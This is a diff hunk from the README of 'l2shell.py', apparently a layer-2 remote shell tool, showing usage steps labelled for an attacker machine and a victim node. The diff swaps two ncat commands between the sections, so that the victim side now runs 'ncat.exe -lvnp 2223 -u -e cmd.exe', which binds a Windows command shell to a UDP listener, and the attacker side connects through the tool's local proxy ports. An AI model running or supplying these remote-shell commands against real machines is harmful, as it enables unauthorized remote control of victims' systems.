@@ -48,14 +48,14 @@ python l2shell.py -c -m <aa:aa:aa:aa:aa:aa> -a <attacker_id> -s <session_id>
 python l2shell.py -c -a <attacker_id> -s <session_id> -p
 ```
 ```
-ncat.exe -lvnp 2223 -u -e cmd.exe
+ncat.exe 127.0.0.1 1111 --source-port 2223 -u
 ```
 ### Victim Node Machine
 ```
 python l2shell.py -l -a <attacker_id> -s <session_id> -p
 ```
 ```
-ncat.exe 127.0.0.1 1111 --source-port 2223 -u
+ncat.exe -lvnp 2223 -u -e cmd.exe
 ```
 `note: The proxy option [-p] [--proxy] opens local ports 1111 and 2222`
 
